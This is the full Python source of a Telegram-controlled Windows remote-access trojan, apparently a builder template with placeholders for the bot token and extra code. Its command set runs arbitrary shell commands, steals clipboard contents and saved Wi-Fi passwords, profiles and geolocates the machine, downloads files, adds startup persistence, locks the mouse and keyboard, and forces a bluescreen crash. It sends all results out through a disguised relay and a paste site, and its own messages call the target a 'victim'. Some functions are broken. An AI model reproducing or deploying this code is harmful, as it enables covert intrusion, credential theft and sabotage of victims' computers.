# import libraries
from os import chdir, getcwd, remove, startfile, mkdir
from time import tzname, sleep, strftime
from pyautogui import write, hotkey
from pynput import mouse, keyboard
from subprocess import getoutput
import win32com.client as wincl
from tkinter import messagebox
import json, wget, webbrowser
from bs4 import BeautifulSoup
from getpass import getuser
from platform import uname
import ctypes.wintypes
from tkinter import *
import threading
import requests
import ctypes
import socket
# get file location
cwd = getcwd()
# create functions
def check_internret(): # send a request to google.com to check internet connection
    try:
        requests.get("https://www.google.com/")
        return True
    except: 
        return False
if check_internret(): # if internet connection was success run main program
    # create first values
    mouse_listener = mouse.Listener(suppress=True)
    keyboard_listener = keyboard.Listener(suppress=True)
    web_ip = requests.get("https://api.ipify.org/").text
    local_ip = socket.gethostbyname(socket.gethostname())
    token = BOT_TOKEN 
    id = TELEGRAM_ID
    max_letter = MAX_LETTER
    keep_disable = True
    commands = ["/check", 
                "/sysinfo", 
                "/get_clipboard", 
                "/set_clipboard", 
                "/kill_process", 
                "/open_site", 
                "/stop_bot",
                "/pass", 
                "/shutdown", 
                "/shell", 
                "/download",
                "/connected_wifi",
                "/wifi_password",
                "/all_connected_wifis",
                "/check_exist",
                "/whereami",
                "/startup",
                "/check_vm",
                "/mkdir",
                "/rm",
                "/show_error",
                "/show_info",
                "/show_warning",
                "/voice",
                "/disable_mouse_keyboard",
                "/enable_mouse_keyboard",
                "/chdir",
                "/process",
                "/check_app_location",
                "/drivers",
                "/open_app", 
                "/write_word", 
                "/press_enter",
                "/alt_f4",
                "/find_file",
                "/get_location",
                "/bluescreen"]
    # commands functions
    def send_to_note(text):
        url = "https://notes.io/short.php"
        data = {"txt":text}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Referer": "https://notes.io/"}

        response = requests.post(url, data=data, headers=headers, timeout=50)

        if response.status_code == 200:
            soup = BeautifulSoup(response.content.decode(), "html.parser")
            find_tag = soup.find("a").findAll("div")
            link = "https://www.notes.io/"
            code = str(find_tag[-1]).replace('<div class="key">', "").replace("</div>", "")
            link += code
            return link
        return "Error while sending to note;"
    def send_msg(message, token=token, id=id):
        try:
            if len(message) > max_letter:
                note_url = send_to_note(message)
                message = note_url
            url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            response = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
            if response.status_code == 200: return True
            else: return False
        except: return False
    def read_msg(token=token):
        try:
            url = f"https://api.telegram.org/bot{token}/GetUpdates"
            data = {"UrlBox" : url,
                    "AgentList" : "Internet Explorer",
                    "VersionsList" : "HTTP/1.1",
                    "MethodList" : "GET"}
            source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data).content.decode()
            soup = BeautifulSoup(source, "html.parser")
            find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
            return find_tag["result"][-1]["message"]["text"]
        except: return False
    # request handling functions
    def sysinfo():
        try:
            u = uname()
            info = f"""    IP: {ip}
    Local IP: {local_ip}
    System: {u[0]}
    System Version: {u[2]}
    OS Caption: {getoutput("wmic os get caption").replace(" ", "").replace("\n", "").replace("Caption", "")}
    OS Architecture: {getoutput("wmic os get OSArchitecture").replace(" ", "").replace("\n", "").replace("OSArchitecture", "")}
    Node: {u[1]}
    Machine: {u[4]}
    Time Zone: {tzname[0]}
    User: {getuser()}
    OS CPU: {getoutput("wmic cpu get name").replace("Name", "").replace(" ", "").replace("\n", "")}
    CPU Cores: {getoutput("wmic cpu get numberofcores").replace("\n", "").replace("NumberOfCores", "").replace(" ", "")}
    Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----------------------------------------------------------------------", "").replace("\n\n", "").replace(" ", "").split("\n")[1][-2:].lower()}"""
            state = send_msg(info)
        except: send_msg("Error;")
    def get_clipboard():
        try: send_msg(getoutput("powershell get-clipboard"))
        except: send_msg("Error;")
    def set_clipboard():
        try:
            data = read_msg().replace("/set_clipboard ", "")
            getoutput(f"powershell set-clipboard '{data}'")
            send_msg(f"Copied as {data}")
        except: send_msg("Error;")
    def kill_process():
        try:
            data = read_msg().replace("/kill_process ", "")
            state = getoutput(f"taskkill /f /im {data}*")
            if "SUCCESS" in state: send_msg(f"Process {data}... is complete closed.")
            else: send_msg("Could not find the process.")
        except: send_msg("Error;")
    def open_site():
        try:
            data = read_msg().replace("/open_site ", "")
            webbrowser.open_new_tab(data)
            send_msg(f"{data} is completely opened.")
        except: send_msg("Error;")
    def stop_bot():
        try:
            send_msg("When you stop this. you cant connect again till app open again. if you are sure send Y if not send N(in 10 seconds): ")
            sleep(10)
            text = read_msg().lower()
            if text == "y": 
                send_msg(f"Bot is going to stop at {strftime("%H : %M : %S")}.")
                exit()
            else: 
                send_msg("Bot dose not closed.")
        except: send_msg("Error;")
    def shutdown():
        try:
            send_msg("System is going to turn off after this message.")
            getoutput("shutdown /s /f /t 0")
            sleep(5)
            send_msg("If you see this message it means PC did not shutdown")
        except: send_msg("Error;")
    def shell():
        try:
            data = read_msg().replace("/shell ", "")
            out = getoutput(data)
            send_msg("This is the response:\n" + out)
        except: send_msg("Error;")
    def download():
        try:
            info = read_msg().replace("/download ").split(" ")
            if info[1] != info[0]: wget.download(info[0], out=info[1])
            else: wget.download(info[0])
            send_msg(f"{info[0]} is downloaded in {info[1]}.")
        except: send_msg("Error;")
    def connected_wifi():
        try:
            ssid = getoutput('netsh wlan show interfaces')
            send_msg(ssid)
        except: send_msg("Error;")
    def wifi_password():
        try:
            ssid = read_msg().replace("/wifi_password ")
            passw = getoutput(f'netsh wlan show profiles "{ssid}" key=clear').replace(" ", "").replace("ProfileoninterfaceWi-Fi:", "").replace("=======================================================================", "").replace("Applied:AllUserProfile", "").replace("Profileinformation", "").replace("-------------------", "").replace("\n\n\n\n\n\n\n\n", "").replace("-----------------", "").replace("-------------", "").replace("--", "").split("\n")
            def find_password():
                for i in range(len(passw)):
                    if "KeyContent" in passw[i]:
                        return passw[i].replace("KeyContent:", "")
            send_msg(find_password())
        except: send_msg("Error;")
    def check_exist():
        try:
            file = read_msg().replace("/check_exist ", "")
            try:
                with open(file, "r") as file:
                    file.readlines()
                    state = True
            except FileNotFoundError: state = False
            send_msg(f"This is the response:\n{state}")
        except: send_msg("Error;")
    def all_commands():
        commands_txt = """"""
        for num, command in enumerate(commands):
            commands_txt += f"{num}. {command}\n"
        send_to_note(commands_txt)
    def all_connected_wifis():
        try:
            send_msg(getoutput("netsh wlan show profiles"))
        except: send_msg("Error;")
    def whereami():
        try: send_msg(getcwd())
        except: send_msg("Error;")
    def startup():
        try:
            url = read_msg().replace("/startup ", "")
            path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\PrograRAT\Startup"
            wget.download(url, out=path)
            send_msg(f"{url} is added to startup.")
        except: send_msg("Error;")
    def check_vm():
        try:
            vm = getoutput("powershell wmic computersystem get model").replace("\n", "").replace("Model", "").replace(" ", "")
            send_msg(vm)
        except: send_msg("Error;")
    def make_dir():
        try:
            name = read_msg().replace("/mkdir ", "")
            mkdir(name)
            send_msg(f"{name} directory is created.")
        except: send_msg("Error;")
    def rm():
        try:
            file = read_msg().replace("/rm ")
            remove(file)
            send_msg(f"{file} is removed.")
        except: send_msg("Error;")
    def show_error():
        try:
            data = read_msg().replace("/show_error ", "").split(" ")
            messagebox.showerror(data[0], data[1])
        except: send_msg("Error;")
    def show_info():
        try:
            data = read_msg().replace("/show_info ", "").split(" ")
            messagebox.showerror(data[0], data[1])
        except: send_msg("Error;")
    def show_warning():
        try:
            data = read_msg().replace("/show_warning ", "").split(" ")
            messagebox.showerror(data[0], data[1])
        except: send_msg("Error;")
    def voice():
        try:
            text = read_msg().replace("/voice ")
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(text)
        except: send_msg("Error;")
    def disable_mouse_keyboard():
        try:
            send_msg("Mouse and Keyboard is getting disable.")
            mouse_listener.start()
            keyboard_listener.start()
        except: send_msg("Error;")
    def enable_mouse_keyboard():
        try:
            send_msg("Mouse and Keyboard is getting enable.")    
            mouse_listener.stop()
            keyboard_listener.stop()
        except: send_msg("Error;")
    def change_dir():
        try:
            addr = read_msg().replace("/chdir ", "")
            chdir(addr)
            send_msg(f"address changed to {addr}")
        except: send_msg("Error;")
    def process():
        try:
            process = getoutput("wmic process get name").replace("Name", "").replace("\n\n", "").replace("System", "").replace("Secure", "").replace("Registry", "").split()
            note_url = send_to_note(process)
            send_msg(f"data saved in: {note_url}")
        except: send_msg("Error;")
    def check_app_location():
        try:
            app = read_msg().replace("/check_app_location ")
            location = getoutput(f"wmic process where name=\"{app}\" get ExecutablePath")
            send_msg(f"This is the response:\n{location}")
        except: send_msg("Error;")
    def drivers():
        try:
            data = getoutput("net share").replace("Share name", "").replace("Resource", "").replace("Remark", "").replace("-------------------------------------------------------------------------------", "").replace("The command completed successfully.", "").replace("\n\n", "").replace("Default share","").replace("Remote IPC", "").replace("Remote Admin", "").replace(r"C:\windows", "").replace("IPC$", "").replace("ADMIN$", "").replace(" ", "").split()
            for driver in range(len(data)):
                data[driver] = data[driver][0:1]
            send_msg(f"This is the response:\n{data}")
        except: send_msg("Error;")
    def open_app():
        try:
            name = read_msg().replace("/open_app ", "")
            try:
                startfile(name)
                send_msg(f"{name} application is opened.")
            except FileNotFoundError:
                send_msg("File not found.")
        except: send_msg("Error;")
    def write_word():
        try:
            text = read_msg().replace("/write_word ", "")
            write(text)
            send_msg(f"{text} is writed.")
        except: send_msg("Error;")
    def press_enter():
        try: hotkey("enter")
        except: send_msg("Error;")
    def alt_f4():
        try: hotkey("alt", "f4")
        except: send_msg("Error;")
    def find_file():
        try:
            data = read_msg().replace("/find_file ", "").split(" ")
            all_files = getoutput(f"dir /s /b *.{data[0]}")
            all_files = all_files.split("\n")
            out = """"""
            for i in range(len(all_files)):
                if i + 1 == data[1]: break
                else:
                    out += f"{i+1}. {all_files[i]}\n"
            send_msg(out)
        except: send_msg("Error;")
    def get_location():
        data = json.loads(requests.get(f"http://ip-api.com/json/{web_ip}").text)
        out = f"""IP: {web_ip}
Country: {data["country"]}
Country Code: {data["countryCode"]}
City: {data["city"]}
Location:
    Lat: {data["lat"]}
    Lon: {data["lon"]}
Time Zone: {data["timezone"]}

Json format:
----------------------------------------------
{data}
----------------------------------------------

** All of this data are generated by web IP. If your victim is using VPN real data can be different."""
        send_to_note(out)
    def bluescreen():        
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    def listener():
        global cwd
        while True:
            try:
                command = str(read_msg())
                if command.startswith("/pass"):  pass #TODO: convert pass -> continue
                else:
                    if command.startswith("/check"): send_msg("This is check message")
                    if command.startswith("/sysinfo"): sysinfo()
                    if command.startswith("/get_clipboard"): get_clipboard()
                    if command.startswith("/set_clipboard"): set_clipboard()
                    if command.startswith("/kill_process"): kill_process()
                    if command.startswith("/open_site"): open_site()
                    if command.startswith("/stop_bot"): stop_bot()
                    if command.startswith("/shutdown"): shutdown()
                    if command.startswith("/shell"): shell()
                    if command.startswith("/download"): download()
                    if command.startswith("/connected_wifi"): connected_wifi()
                    if command.startswith("/wifi_password"): wifi_password()
                    if command.startswith("/check_exist"): check_exist()
                    if command.startswith("/all_commands"): all_commands()
                    if command.startswith("/all_connected_wifis"): all_connected_wifis()
                    if command.startswith("/whereami"): whereami()
                    if command.startswith("/startup"): startfile()
                    if command.startswith("/check_vm"): check_vm()
                    if command.startswith("/mkdir"): make_dir()
                    if command.startswith("/rm"):  rm()
                    if command.startswith("/show_error"): threading.Thread(target=show_error).start()
                    if command.startswith("/show_info"): threading.Thread(target=show_info).start()
                    if command.startswith("/show_warning"): threading.Thread(target=show_warning).start()
                    if command.startswith("/voice"): voice()
                    if command.startswith("/disable_mouse_keyboard"): threading.Thread(target=disable_mouse_keyboard).start()
                    if command.startswith("/enable_mouse_keyboard"): threading.Thread(target=enable_mouse_keyboard).start()
                    if command.startswith("/chdir"): change_dir()
                    if command.startswith("/process"): process()
                    if command.startswith("/check_app_location"):  check_app_location()# Check run locations
                    if command.startswith("/drivers"): drivers()
                    if command.startswith("/open_app"): threading.Thread(target=open_app).start()
                    if command.startswith("/write_word"): write_word()
                    if command.startswith("/press_enter"): press_enter()
                    if command.startswith("/alt_f4"): alt_f4()
                    if command.startswith("/find_file"): threading.Thread(target=find_file).start()
                    if command.startswith("/get_location"): get_location()
                    if command.startswith("/bluescreen"): bluescreen()
                    send_msg("click /pass")
                    sleep(5)
            except: 
                send_msg("start() function error. try again...")
                continue
    send_msg(f"Connected to victim with {web_ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. When trap close I will notic you.")
ONLINE_CODE
    send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
    listener()
else: # if network has broken run offline code
OFFLINE_CODE